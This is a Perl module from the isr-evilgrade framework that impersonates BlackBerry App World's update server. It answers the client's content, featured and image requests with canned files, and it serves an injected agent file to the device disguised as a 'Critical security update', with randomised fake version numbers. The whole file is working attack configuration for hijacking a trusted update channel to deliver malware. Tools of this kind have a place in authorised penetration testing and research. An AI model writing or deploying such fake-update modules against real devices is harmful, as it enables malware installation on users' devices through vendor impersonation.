###############
# bbappworld.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::bbappworld;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'bbappworld',
    'version'     => '1.0',
    'appver'      => '< 1.1.0.33',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => 'appworld.blackberry.com',

    #http://drbolsen.wordpress.com/2008/07/14/coddec-released/
    #http://www.dontstuffbeansupyournose.com/?p=99
    'request' => [
        {   'req'    => '/ClientAPI/content/',    #regex friendly #10.0
            'type'   => 'file',                   #file|string|agent|install
            'method' => '',                       #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'    => './include/bbappworld/click_aplicacion',
            'cheader' => "HTTP/1.1 200 OK\r\n",
        },
        {   'req'    => '/ClientAPI/featured',    #regex friendly #10.0
            'type'   => 'file',                   #file|string|agent|install
            'method' => '',                       #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'    => './include/bbappworld/featured',
            'cheader' => "HTTP/1.1 200 OK\r\n",
        },
        {   'req'    => '/ClientAPI/image/',      #regex friendly #10.0
            'type'   => 'file',                   #file|string|agent|install
            'method' => '',                       #any
            'bin'    => 0,
            'string' => "",
            'parse'  => 0,
            'file'    => './include/bbappworld/images',
            'cheader' => "HTTP/1.1 200 OK\r\n",
        },

        {   'req'    => '.yim',                   #regex friendly
            'type'   => 'agent',                  #file|string|agent|install
            'method' => '',                       #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.cab', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 0,
            'desc' => 'Status'
        },
        'description' => {
            'val'  => 'Critical security update',
            'desc' => 'Description display in the update'
        },
        'version' => {
            'val' =>
                '\'30.\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(4).\'.\'.isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
